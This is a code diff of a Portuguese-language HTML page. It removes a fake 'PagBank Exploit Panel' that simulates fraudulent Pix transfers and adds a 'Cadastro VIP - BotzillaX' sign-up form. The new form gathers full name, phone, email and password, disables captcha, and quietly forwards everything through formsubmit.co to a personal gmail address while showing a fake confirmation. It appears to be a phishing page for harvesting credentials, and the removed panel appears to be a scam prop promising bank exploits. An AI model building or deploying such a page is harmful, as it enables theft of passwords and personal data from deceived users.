@@ -2,111 +2,124 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>PagBank Checker</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cadastro - BotzillaX</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background-color: #000;
-      color: #33ff33;
-      font-family: monospace;
-      padding: 20px;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px;
+      min-height: 100vh;
+      margin: 0;
     }
 
-    .terminal {
-      background: #111;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px #00ff00;
-      max-width: 600px;
-      margin: auto;
-      height: 400px;
-      overflow-y: auto;
-      border: 2px solid #00ff00;
-    }
-
-    .linha {
-      margin-bottom: 5px;
-    }
-
-    .titulo {
-      text-align: center;
-      font-size: 22px;
+    h2 {
       margin-bottom: 20px;
-      color: #00ff00;
+      color: #333;
     }
 
-    .botao {
-      background: #00ff00;
-      color: #000;
-      border: none;
-      padding: 12px 24px;
-      font-size: 16px;
-      font-weight: bold;
+    form, .final {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    input {
+      margin-bottom: 15px;
+      padding: 12px;
+      border: 1px solid #ccc;
       border-radius: 6px;
-      cursor: pointer;
-      margin: 20px auto;
-      display: block;
+      font-size: 15px;
     }
 
-    .total {
-      margin-top: 20px;
-      font-size: 18px;
+    button {
+      padding: 12px;
+      background: #3a86ff;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #265dd8;
+    }
+
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3a86ff;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .final {
+      display: none;
       text-align: center;
+    }
+
+    .final h3 {
+      color: green;
     }
   </style>
 </head>
 <body>
 
-  <div class="titulo">☠ PagBank Exploit Panel ☠</div>
+  <form id="cadastro" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" onsubmit="mostrarCarregando(event)">
+    <h2>Cadastro VIP - BotzillaX</h2>
+    <input type="text" name="nome" placeholder="Nome completo" required>
+    <input type="tel" name="telefone" placeholder="Telefone" required>
+    <input type="email" name="email" placeholder="E-mail" required>
+    <input type="password" name="senha" placeholder="Senha" required>
+    <input type="password" name="confirmar_senha" placeholder="Confirmar senha" required>
 
-  <div class="terminal" id="terminal">
-    <div class="linha">[BOOT] Iniciando exploit no sistema PagBank...</div>
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+
+    <button type="submit">Cadastrar</button>
+  </form>
+
+  <div class="final" id="final">
+    <div class="loader"></div>
+    <p id="mensagem">Processando seus dados...</p>
   </div>
 
-  <button class="botao" onclick="executarExploit()">Executar Manualmente</button>
-
-  <div class="total">Total recebido: <span id="total">R$ 0,00</span></div>
-
   <script>
-    let total = 0;
-    const valorPorExecucao = 150;
-    const terminal = document.getElementById("terminal");
-    const totalSpan = document.getElementById("total");
+    function mostrarCarregando(event) {
+      event.preventDefault();
+      const form = document.getElementById('cadastro');
+      const final = document.getElementById('final');
+      const mensagem = document.getElementById('mensagem');
 
-    function formatar(valor) {
-      return 'R$ ' + valor.toFixed(2).replace('.', ',');
-    }
+      form.style.display = 'none';
+      final.style.display = 'flex';
+      mensagem.innerText = 'Processando seus dados...';
 
-    function logLinha(texto) {
-      const linha = document.createElement("div");
-      linha.classList.add("linha");
-      linha.innerText = texto;
-      terminal.appendChild(linha);
-      terminal.scrollTop = terminal.scrollHeight;
-    }
-
-    function executarExploit() {
-      const id = Math.floor(Math.random() * 100000);
-
-      logLinha(`[ID #${id}] Executando transferência para Lucas...`);
-      
       setTimeout(() => {
-        logLinha(`[ID #${id}] ✅ Pix de R$ ${valorPorExecucao},00 enviado.`);
-        logLinha(`[ID #${id}] ❗ Erro: saldo original mantido. [BUG DETECTADO]`);
-        total += valorPorExecucao;
-        totalSpan.innerText = formatar(total);
+        document.querySelector('.loader').style.display = 'none';
+        mensagem.innerHTML = '<h3>Cadastro realizado com sucesso!</h3>Um de nossos atendentes irá entrar em contato.';
+      }, 3000);
 
-        // Disparar notificação (caso seu app suporte via localhost)
-        try {
-          fetch("http://127.0.0.1:1234/notificacao");
-        } catch (e) {
-          logLinha(`[ID #${id}] ⚠ Erro ao enviar notificação.`);
-        }
-      }, 2000);
+      // Envia os dados
+      event.target.submit();
     }
-
-    // Executa automaticamente a cada 03 segundos
-    setInterval(executarExploit, 10000);
   </script>
 
 </body>
